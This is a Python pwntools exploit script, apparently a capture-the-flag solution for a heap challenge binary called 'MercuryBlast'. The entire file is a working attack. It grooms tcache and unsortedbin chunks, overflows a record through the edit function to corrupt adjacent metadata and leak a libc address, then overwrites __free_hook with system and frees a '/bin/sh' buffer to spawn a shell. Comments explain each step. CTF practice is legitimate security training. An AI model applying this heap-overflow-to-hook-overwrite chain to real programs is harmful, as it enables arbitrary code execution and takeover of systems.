from pwn import * 

binary = "./MercuryBlast"
p = process(binary)
s = '''
b * add_record
b * edit_record+384
b * delete_record
b * print_records
b * blast
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)
context.binary = binary


def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")

for i in range(8):
    add_record(0x100, b"a") # chunk_pair 0 - 7. Add 8 records which size > 0x80 to delete later to get unsortedbin
add_record(0x100, b"a")     # chunk_pair 8. Add one more, closest to the Top chunk, prevent merging 
for i in range(8):          
    delete_record(i)        # delete 8 (16) records, first 7 goes to tcachebin, last one is in unsortedbin
add_record(0x100, b"a")     # chunk_pair 0, it was previously chunk_pair 7. Now it is below (at a lower address) chunk_pair 8 

 
payload = flat(
    b"A" * 0x100,
    0,
    0x21,
    0x1,
    0x1000
)
add_record(0x100, b"b")     # chunk_pair 1, it was previously chunk_pair 6, now it is below chunk_pair 0

edit_record(1, 0x200, payload) # buffer goes up to higher address, overwrite chunk_pair 0 which is right above, by overflowing 0x100 byte size with 0x200 of bytes


print_record() # leak the addresses 

# parse the leaked glibc address 
leak = p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00') 
leak = u64(leak)
print(hex(leak))

libc_base = leak - 0x1ecbe0
sys_addr = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
def arbitrary_write(addr, target):
    payload = flat(
        b"A" * 0x100,
        0, # metadata
        0x21, # metadata
        0x1, # temperature 
        0x1000, # description size
        addr
    )
    edit_record(1, 0x200, payload)
    edit_record(0, 0x200, p64(target))

gdb.attach(p, s)
arbitrary_write(free_hook, sys_addr)
add_record(0x100, "/bin/sh")
delete_record(2)

#print(hex(libc.address)) # got it
p.interactive()